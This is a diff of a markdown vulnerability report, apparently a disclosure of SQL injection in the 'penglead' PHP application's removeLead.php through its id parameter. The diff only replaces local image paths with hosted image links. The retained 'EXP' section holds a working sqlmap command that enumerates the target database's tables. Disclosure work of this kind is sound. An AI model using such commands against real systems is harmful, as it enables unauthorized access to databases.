@@ -6,7 +6,7 @@ Vulnerability trigger parameter: $id
 
 The process of vulnerability discovery is as follows：
 
-![image-20221219163848150](C:\markdown\images\image-20221219163848150.png)
+![image](https://user-images.githubusercontent.com/30823782/208410977-4853452c-f26f-4bd6-9fcf-187bfebddd46.png)
 
 EXP:
 
@@ -14,4 +14,4 @@ EXP:
 sqlmap.py -u "http://192.168.31.50/penglead/php_action/removeLead.php?id=1" --dbms=mysql -D penglead --tables
 ```
 
-![image-20221219163551220](C:\markdown\images\image-20221219163551220.png)
+![image](https://user-images.githubusercontent.com/30823782/208411011-62e0095d-ecfe-40c6-a880-4b33fa55d7b1.png)
